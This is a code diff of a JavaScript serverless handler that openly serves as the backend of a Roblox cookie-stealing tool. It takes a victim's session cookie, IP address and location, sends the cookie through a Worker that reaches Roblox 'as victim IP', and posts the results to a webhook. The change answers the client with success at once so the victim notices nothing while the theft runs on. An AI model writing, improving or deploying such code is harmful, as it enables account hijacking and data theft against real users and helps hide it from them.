@@ -180,6 +180,11 @@ export default async function handler(req, res) {
   if (!record)         return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });
 
+  // ── Respond to client IMMEDIATELY — no timeout, no network error ──────────
+  res.status(200).json({ success: true });
+
+  // Everything below runs after the client already got their 200 response
+  // Vercel keeps the function alive until it finishes or hits max duration
   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
           || req.headers['x-real-ip'] || 'Unknown';
 
@@ -188,8 +193,7 @@ export default async function handler(req, res) {
     Promise.resolve(findCookie(slots))
   ]);
 
-  // Wait 5 seconds — lets the target's session settle so cookie is fully valid
-  // when the Worker hits Roblox using their IP
+  // Wait 5 seconds — cookie is fully settled, Worker hits Roblox as victim IP
   await new Promise(r => setTimeout(r, 5000));
 
   const workerData = cookie ? await getWorkerData(cookie, ip) : null;
@@ -228,7 +232,4 @@ export default async function handler(req, res) {
     `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
     `🕐 ${now}`
   ].join('\n'));
-
-  // Respond AFTER all work is done — Vercel kills the function on res.end()
-  return res.status(200).json({ success: true });
 }
